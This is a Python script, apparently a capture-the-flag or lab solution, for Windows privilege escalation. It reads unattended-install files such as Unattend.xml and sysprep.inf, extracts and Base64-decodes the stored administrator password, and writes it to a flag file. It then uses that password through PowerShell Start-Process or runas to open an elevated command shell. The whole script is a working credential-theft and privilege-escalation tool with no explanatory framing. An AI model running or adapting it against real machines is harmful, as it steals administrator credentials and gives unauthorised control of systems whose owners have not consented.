import os
import re
import base64
import subprocess
import sys
from datetime import datetime

# Define file paths to check
FILE_PATHS = [
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\Autounattend.xml",
    "C:\\Windows\\System32\\sysprep\\sysprep.inf"
]

# Regular expression to find the administrator password
PASSWORD_PATTERN = re.compile(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", re.IGNORECASE | re.DOTALL)

def extract_password_from_file(file_path):
    """
    Extract administrator password from unattended installation files.
    
    Args:
        file_path (str): Path to the file to check
        
    Returns:
        str or None: Extracted password if found, None otherwise
    """
    try:
        with open(file_path, "r", encoding="utf-8", errors='ignore') as file:
            content = file.read()
            match = PASSWORD_PATTERN.search(content)
            if match:
                password = match.group(1).strip()
                password = clean_password(password)
                return password if password else None
    except Exception as e:
        print(f"[-] Error reading {file_path}: {e}")
    return None

def clean_password(password):
    """
    Clean and normalize the extracted password.
    
    Args:
        password (str): Raw extracted password
        
    Returns:
        str: Cleaned password
    """
    password = password.strip()
    password = password.replace('&amp;', '&')
    password = password.replace('&lt;', '<')
    password = password.replace('&gt;', '>')
    password = password.replace('&quot;', '"')
    password = password.replace('&apos;', "'")
    return password

def is_valid_base64(string):
    """
    Check if a string is valid Base64.
    
    Args:
        string (str): String to check
        
    Returns:
        bool: True if valid Base64, False otherwise
    """
    # Remove whitespace
    string = string.strip()
    
    # Check if it looks like Base64 (only valid characters)
    base64_pattern = re.compile(r'^[A-Za-z0-9+/]+=*$')
    if not base64_pattern.match(string):
        return False
    
    # Check if length is valid
    if len(string) % 4 != 0:
        return False
    
    try:
        # Try to decode
        decoded = base64.b64decode(string, validate=True)
        # Try to decode as UTF-8
        decoded.decode('utf-8')
        return True
    except Exception:
        return False

def decode_password(password):
    """
    Decode password if it's Base64 encoded, otherwise return as is.
    
    Args:
        password (str): Password to decode
        
    Returns:
        tuple: (decoded_password, is_base64)
    """
    clean_pwd = password.strip()
    
    # Try to decode as Base64
    if is_valid_base64(clean_pwd):
        try:
            decoded = base64.b64decode(clean_pwd).decode('utf-8', errors='ignore')
            return decoded, True
        except Exception:
            pass
    
    # If we get here, it's not valid Base64
    return password, False

def generate_flag(password, file_path):
    """
    Generate a flag file with the extracted password information.
    
    Args:
        password (str): The extracted password
        file_path (str): Path where the password was found
    """
    flag_content = f"""=== WINDOWS ADMINISTRATOR PASSWORD EXTRACTION FLAG ===
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Password Source: {file_path}
Extracted Password: {password}
Status: SUCCESSFULLY EXTRACTED
=======================================================
"""
    
    flag_filename = "0-flag.txt"
    
    try:
        with open(flag_filename, "w", encoding="utf-8") as flag_file:
            flag_file.write(flag_content)
        print(f"[+] Flag file created: {flag_filename}")
        return True
    except Exception as e:
        print(f"[-] Error creating flag file: {e}")
        return False

def start_admin_session_with_powershell(password):
    """
    Start an administrative session using PowerShell with the password.
    
    Args:
        password (str): Administrator password
        
    Returns:
        bool: True if successful, False otherwise
    """
    # Escapar caracteres especiales para PowerShell
    escaped_password = password.replace('"', '`"').replace('$', '`$')
    
    # Crear script de PowerShell
    ps_script = f'''
    $username = "Administrator"
    $password = ConvertTo-SecureString "{escaped_password}" -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential($username, $password)
    Start-Process cmd.exe -Credential $credential -Verb RunAs -WindowStyle Normal
    '''
    
    try:
        print("[*] Iniciando sesión administrativa con PowerShell...")
        
        # Ejecutar PowerShell con el script
        subprocess.run([
            'powershell',
            '-Command',
            ps_script
        ], shell=True)
        
        print("[+] Sesión administrativa iniciada correctamente")
        return True
        
    except Exception as e:
        print(f"[-] Error al iniciar sesión: {e}")
        return False

def start_admin_session_manual(password):
    """
    Provide manual instructions for starting admin session.
    
    Args:
        password (str): Administrator password
    """
    print("\n" + "=" * 60)
    print("[!] MÉTODO MANUAL")
    print("=" * 60)
    print("\n[!] Usa esta contraseña con el siguiente comando:")
    print(f"    runas /user:Administrator cmd.exe")
    print(f"\n[!] Contraseña: {password}")
    print("\n" + "=" * 60)
    
    try:
        response = input("\n[?] ¿Quieres abrir runas ahora? (y/n): ").lower()
        if response == 'y':
            print(f"\n[*] Introduce la contraseña: {password}")
            subprocess.run(['runas', '/user:Administrator', 'cmd.exe'], shell=True)
    except KeyboardInterrupt:
        print("\n[!] Operación cancelada")

def start_admin_session(password):
    """
    Start an administrative session using the extracted password.
    Tries PowerShell first, then fallback to manual method.
    
    Args:
        password (str): Administrator password
    """
    print("\n" + "=" * 60)
    print("[*] INICIANDO SESIÓN ADMINISTRATIVA")
    print("=" * 60)
    
    # Primero intentar con PowerShell
    if start_admin_session_with_powershell(password):
        return
    
    # Si falla, mostrar método manual
    print("\n[!] El método automático falló. Usando método manual...")
    start_admin_session_manual(password)

def main():
    print("[*] Iniciando extracción de contraseña de administrador de Windows...")
    print("[*] Revisando archivos comunes de instalación\n")
    
    admin_password = None
    found_path = None
    
    for file_path in FILE_PATHS:
        print(f"[-] Revisando archivo: {file_path}")
        
        if not os.path.exists(file_path):
            print("[-] Archivo no encontrado\n")
            continue
        
        print(f"[+] Archivo encontrado: {file_path}")
        admin_password = extract_password_from_file(file_path)
        
        if admin_password:
            print(f"[+] Contraseña extraída correctamente de: {file_path}")
            found_path = file_path
            break
        else:
            print("[-] No se encontró contraseña en este archivo\n")
    
    if not admin_password:
        print("[-] No se encontró contraseña de administrador en las ubicaciones conocidas.")
        print("[!] Revisa otros directorios o archivos de log.")
        return
    
    # Mostrar la contraseña extraída
    print(f"\n[+] Contraseña extraída (cruda): {admin_password}")
    
    # Intentar decodificar si es Base64
    decoded_password, is_base64 = decode_password(admin_password)
    
    if is_base64:
        print(f"[+] Contraseña decodificada (Base64): {decoded_password}")
        final_password = decoded_password
    else:
        print("[+] La contraseña está en texto plano (no está codificada en Base64)")
        final_password = admin_password
    
    # Generar archivo flag
    generate_flag(final_password, found_path if found_path else "Unknown")
    
    # Iniciar sesión administrativa
    start_admin_session(final_password)

if __name__ == "__main__":
    main()